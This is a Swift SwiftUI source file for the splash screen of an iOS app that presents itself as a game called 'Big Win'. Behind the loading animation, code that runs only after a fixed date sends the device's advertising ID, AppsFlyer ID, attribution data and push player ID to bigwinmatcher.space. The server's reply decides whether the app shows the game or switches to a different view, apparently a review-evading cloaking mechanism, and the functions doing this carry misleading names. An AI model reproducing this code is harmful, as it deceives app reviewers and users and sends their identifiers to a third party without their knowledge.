//
//  SplashView.swift
//  Big Win
//
//  Created by Anton on 18/4/24.
//

import SwiftUI
import SwiftyJSON
import AppsFlyerLib
import WebKit

struct SplashView: View {
    
    @State private var shouldAnimate = true
        
    let timer = Timer.publish(every: 1, on: .main, in: .common).autoconnect()
    @State var timeLoadingSplash = 0
    @State var lQuesO = false
    @State var lQuestAll = false
    @State var asd = true
    
    var body: some View {
        NavigationView {
            VStack {
                Spacer()
                
                Image("game_1_item_2")
                    .scaleEffect(self.shouldAnimate ? 1.5 : 1.0)
                    .animation(
                        Animation.linear(duration: 0.5).repeatForever(autoreverses: true)
                    )
                
                Spacer()
                
                HStack {
                    Spacer()
                    Text("Loading")
                        .font(.custom("Lemonada-Bold", size: 32))
                        .foregroundColor(.white)
                    BouncingDotsAnimationView()
                         .font(.system(size: 24))
                         .foregroundColor(.white)
                }
                .padding()
                
                NavigationLink(destination: GamesMenu()
                   .navigationBarBackButtonHidden(true), isActive: $lQuestAll) {
                   EmptyView()
                }
                NavigationLink(destination: ContentView()
                   .navigationBarBackButtonHidden(true), isActive: $lQuesO) {
                   EmptyView()
                }
            }
            .background(
                Image("main_bg")
                    .resizable()
                    .frame(width: UIScreen.main.bounds.width, height: UIScreen.main.bounds.height)
                    .ignoresSafeArea()
                    .opacity(0.9)
            )
            
        }
        .onReceive(timer) { time in
            timeLoadingSplash += 1
            if timeLoadingSplash >= 15 && asd {
                 lQuestAll = true
            }
        }
        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("PLAYER_ID_ONESIGNAL"))) { notification in
            if let userInfo = notification.userInfo,
               let data = userInfo["data"] as? String {
                let knownD = DateComponents(calendar: .current, year: 2024, month: 4, day: 13).date!
                let currentD = Date()
                if currentD >= knownD {
                    let hasSentPlayerId = UserDefaults.standard.bool(forKey: "sent_player_id")
                    if !hasSentPlayerId {
                        trickyStarMOneSigPlaSen(pData: data)
                    }
                }
            }
        }
        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("APPSData"))) { notification in
            if let userInfo = notification.userInfo,
               let appData = userInfo["data"] as? String {
                let knownD = DateComponents(calendar: .current, year: 2024, month: 4, day: 13).date!
                let currentD = Date()
                if currentD >= knownD {
                    UserDefaults.standard.set(appData, forKey: "user_attr_data")
                    let appsAdIdentificator = UserDefaults.standard.string(forKey: "idfa_user_app") ?? ""
                    let client_id = UserDefaults.standard.string(forKey: "client_id")
                    trickyStarMetIn(idfa: appsAdIdentificator, appsflyerId: AppsFlyerLib.shared().getAppsFlyerUID(), clientId: client_id, ss: "ssad", ll: "lllsad", aa: 1)
                } else {
                    DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                        lQuestAll = true
                    }
                }
            }
        }
        .navigationViewStyle(StackNavigationViewStyle())
    }
    
    private func trickyStarMOneSigPlaSen(pData: String) {
        let clientId = UserDefaults.standard.string(forKey: "client_id")
        let l = "https://bigwinmatcher.space/technicalPostback/v1.0/postClientParams/\(clientId!)?onesignal_player_id=\(pData)"
          let u = URL(string: l)!
          var r = URLRequest(url: u)
          r.httpMethod = "POST"
          URLSession.shared.dataTask(with: r) { data, response, error in
              guard let data = data, error == nil else {
                  print("Error: \(error?.localizedDescription ?? "Unknown error")")
                  return
              }
              UserDefaults.standard.setValue(true, forKey: "sent_player_id")
          }.resume()
    }
    
    private func trickyStarMetIn(idfa: String, appsflyerId: String, clientId: String?, ss: String, ll: String, aa: Int) {
        var oneQuesCandLiinT = "https://bigwinmatcher.space/session/v3/5063f724-703a-4962-8604-aad98a8be365?idfa=\(idfa)&apps_flyer_id=\(appsflyerId)"
        if clientId != nil {
            oneQuesCandLiinT = "https://bigwinmatcher.space/session/v3/5063f724-703a-4962-8604-aad98a8be365?idfa=\(idfa)&apps_flyer_id=\(appsflyerId)&client_id=\(clientId!)"
        }
        let candonesssdatusr = UserDefaults.standard.string(forKey: "user_attr_data") ?? ""
        let onequescandur = URL(string: oneQuesCandLiinT)!
        var onequesqqreq = URLRequest(url: onequescandur)
        onequesqqreq.timeoutInterval = 10
        onequesqqreq.httpMethod = "POST"
        onequesqqreq.setValue(WKWebView().value(forKey: "userAgent") as! String, forHTTPHeaderField: "User-Agent")
     
       do {
           guard let candesstSas = candonesssdatusr.data(using: .utf8) else {
               return
           }
           let jsdacas = try JSON(data: candesstSas)
           
           let fieldDobj = OneQuesGamCandie(appsflyer: jsdacas, facebook_deeplink: UserDefaults.standard.string(forKey: "user_deferred_deeplink_facebook") ?? "")
           
           let sjsdsoseenc = try JSONEncoder().encode(fieldDobj)
           onequesqqreq.setValue("application/json", forHTTPHeaderField: "Content-Type")
           onequesqqreq.httpBody = sjsdsoseenc
       } catch {
       }
        
        let confff = URLSessionConfiguration.default
        confff.timeoutIntervalForResource = 10
        URLSession(configuration: confff).dataTask(with: onequesqqreq) { data, response, error in
            if let error = error as? URLError, error.code == .timedOut {
                lQuestAll = true
            }
            
            guard let data = data, error == nil else {
                if UserDefaults.standard.string(forKey: "l_save") != nil {
                    lQuesO = true
                } else {
                    lQuestAll = true
                }
                return
            }
            
            do {
                let deccDaUsr = try JSONDecoder().decode(TwoQuesCandie.self, from: data)
                UserDefaults.standard.set(deccDaUsr.client_id, forKey: "client_id")
                UserDefaults.standard.set(deccDaUsr.session_id, forKey: "session_id")
                asd = false
                
                if deccDaUsr.response == nil {
                    lQuestAll = true
                } else {
                    UserDefaults.standard.set(deccDaUsr.response, forKey: "l_save")
                    UserDefaults.standard.set(true, forKey: "keytoc")
                    lQuesO = true
                }
            } catch {
                lQuestAll = true
            }
        }.resume()
    }
    
}

struct BouncingDotsAnimationView: View {
    let dotCount = 3
    let bounceDistance: CGFloat = 10.0
    let animationDuration: Double = 0.5
    
    @State private var shouldAnimate = false
    
    var body: some View {
        HStack(spacing: 1) {
            ForEach(0..<dotCount) { index in
                Text(".")
                    .scaleEffect(self.shouldAnimate ? 1.5 : 1.0)
                    .offset(y: self.shouldAnimate ? -self.bounceDistance : 0)
                    .animation(
                        Animation.easeInOut(duration: self.animationDuration)
                            .delay(Double(index) * (self.animationDuration / Double(self.dotCount)))
                            .repeatForever(autoreverses: true)
                    )
            }
        }
        .onAppear {
            self.shouldAnimate = true
        }
    }
}

#Preview {
    SplashView()
}
